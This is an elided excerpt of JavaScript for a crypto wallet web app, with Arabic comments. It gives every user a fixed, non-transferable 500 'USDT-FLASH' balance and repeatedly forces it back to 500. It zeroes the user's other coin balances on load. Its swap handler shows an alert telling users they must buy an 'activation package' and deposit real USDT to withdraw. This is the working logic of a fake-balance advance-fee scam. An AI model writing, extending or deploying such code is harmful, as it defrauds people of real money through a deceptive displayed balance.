...
const walletState = {
    ...
    transactions: [],
    tokens: {
        'USDT-FLASH': { balance: 500, price: 1.00 },
...
function loadWalletData() {
    ...
    // تصفير جميع العملات
    walletState.tokens['USDT'].balance = 0;
    walletState.tokens['PEPE'].balance = 0;
    walletState.tokens['DOGE'].balance = 0;
    walletState.tokens['SHIB'].balance = 0;
    
    // رصيد USDT Flash ثابت 500 لجميع المستخدمين
    walletState.tokens['USDT-FLASH'].balance = 500;
...
function updateBalanceDisplay() {
    ...
    // التأكد من أن USDT Flash دائماً 500
    walletState.tokens['USDT-FLASH'].balance = 500;
...
function saveWalletData() {
    ...
    // حفظ أرصدة جميع العملات ماعدا USDT Flash (ثابت 500 دائماً)
    userData.tokens = {};
    Object.keys(walletState.tokens).forEach(token => {
        if (token !== 'USDT-FLASH') {
    ...
    // التأكد من عدم حفظ رصيد USDT Flash - يبقى 500 دائماً
    walletState.tokens['USDT-FLASH'].balance = 500;
...
function updateTokensList() {
    ...
    tokenItems.forEach(item => {
        ...
        if (tokenData) {
            ...
            amountEl.textContent = tokenData.balance.toFixed(2);
...
function confirmSwap() {
    ...
    // منع تحويل USDT Flash نهائياً - الرصيد ثابت 500
    if (fromToken === 'USDT-FLASH') {
        alert('⚠️ USDT Flash Cannot Be Transferred\n\n🔒 This is a promotional balance that cannot be converted or transferred.\n\n📌 Balance is locked at 500 USDT Flash permanently.\n\n💡 To activate withdrawal, you must:\n1️⃣ Purchase an activation package\n2️⃣ Deposit real USDT to your wallet\n3️⃣ Follow the liquidation process');
        return;
    }
    
    // منع التحويل إلى USDT Flash
    if (toToken === 'USDT-FLASH') {
        alert('⚠️ Cannot Convert to USDT Flash\n\n🔒 USDT Flash balance is fixed at 500 and cannot be increased.');
        return;
    }
    ...
    // التأكد من بقاء USDT Flash عند 500 دائماً
    walletState.tokens['USDT-FLASH'].balance = 500;
